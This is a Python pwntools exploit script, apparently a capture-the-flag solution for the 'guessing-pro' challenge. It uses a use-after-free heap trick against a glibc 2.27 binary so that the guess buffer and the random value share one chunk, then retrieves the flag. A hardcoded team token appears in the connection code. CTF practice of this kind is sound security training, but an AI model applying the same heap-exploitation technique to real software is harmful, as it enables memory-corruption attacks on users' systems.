from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc-2.27.so", checksec = False)
ld = ELF("ld-2.27.so", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("guessing-pro.challs.snakectf.org", 1337, ssl = True)
        r.sendlineafter(b"token: ", b"921965abb6e1f8ea06bf2c88a9aead76")        # Send team's token to access challenge

    return r


def take_guess(data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", data)


def confirm_guess() -> bytes:
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", b"y")
    return r.recvlines(3)[-1]


def delete_guess():
    r.sendlineafter(b"> ", b"3")


def new_random():
    r.sendlineafter(b"> ", b"4")


def main():
    r = conn()

    take_guess(b"A" * 0x31)     # Allocate chunk for buffer.

    delete_guess()              # Deallocate buffer so...
    new_random()                # ...new chunk for random value (RV) will be the freed one.
                                # Buffer and RV now point to same chunk but there's a value (v3) set
                                # to 0 that doesn't let us guess; we need to reallocate the same chunk.

    delete_guess()              # Since both points to the very same chunk, the free won't segfault

    take_guess(b"A" * 0x31)     # Allocate (same) chunk for the buffer. Now, as before, both Buffer and
                                # RV point to same chunk but 'v3' integer is set to 1 (ready for the guess)
    
    flag = confirm_guess()
    log.success(f"Flag obtained: {flag.decode('ascii')}")


if __name__ == "__main__":
    main()
